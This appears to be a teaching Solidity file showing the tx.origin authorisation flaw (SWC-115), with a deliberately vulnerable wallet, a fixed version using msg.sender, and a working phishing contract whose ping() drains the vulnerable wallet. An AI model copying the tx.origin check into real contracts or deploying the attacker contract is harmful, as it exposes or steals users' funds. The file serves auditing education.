// SPDX-License-Identifier: MIT
// INTENTIONALLY VULNERABLE TEACHING CONTRACTS. Local test chains only. Do not deploy.
pragma solidity ^0.8.20;

/// @dev VULNERABLE: authorises by tx.origin, which is the externally-owned
/// account that started the transaction, not the immediate caller. If the owner
/// can be tricked into calling an attacker contract, that contract can move the
/// owner's funds because tx.origin is still the owner.
/// Audit tell: `require(tx.origin == ...)` used for authorisation. (SWC-115)
contract VulnerableWallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable to, uint256 amount) external {
        require(tx.origin == owner, "not owner"); // <-- tx.origin, not msg.sender
        to.transfer(amount);
    }

    receive() external payable {}
}

/// @dev FIXED: authorises by msg.sender, the immediate caller.
contract SecureWallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable to, uint256 amount) external {
        require(msg.sender == owner, "not owner");
        to.transfer(amount);
    }

    receive() external payable {}
}

/// @dev The phishing contract. If the owner is tricked into calling ping(),
/// tx.origin is the owner, so the vulnerable wallet authorises the transfer to
/// the attacker. Against SecureWallet, msg.sender is this contract, so it reverts.
contract PhishingAttacker {
    VulnerableWallet public immutable target;
    address payable public immutable attacker;

    constructor(address walletAddress, address payable attackerPayout) {
        target = VulnerableWallet(payable(walletAddress));
        attacker = attackerPayout;
    }

    function ping() external {
        // Looks harmless to the victim; actually drains their wallet.
        target.transfer(attacker, address(target).balance);
    }
}
